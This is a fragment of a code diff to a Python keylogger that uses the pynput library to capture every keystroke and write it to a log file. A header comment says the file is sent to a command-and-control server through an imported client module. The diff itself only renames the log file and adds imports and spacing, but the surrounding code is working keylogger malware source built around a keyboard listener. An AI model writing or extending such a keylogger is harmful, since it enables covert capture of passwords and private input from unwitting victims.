@@ -7,14 +7,18 @@ file to the control and command server.
 
 Starting key input from:
 https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
+the main() and on_press() functions
 '''
 
 from pynput import keyboard
 import os
+import time
 import random
 import client
+import sys
 
-KEY_FILE = "keylogged.txt"
+KEY_FILE = "client-keyslogged.txt"
+
 
 def writeToFile(key):
 	'''
@@ -60,9 +64,11 @@ def on_press(key):
 		
 	writeToFile(output)
 
+
 def main():
 	with keyboard.Listener(on_press = on_press) as listener:
 		listener.join()
+
 
 if __name__ == "__main__":
 
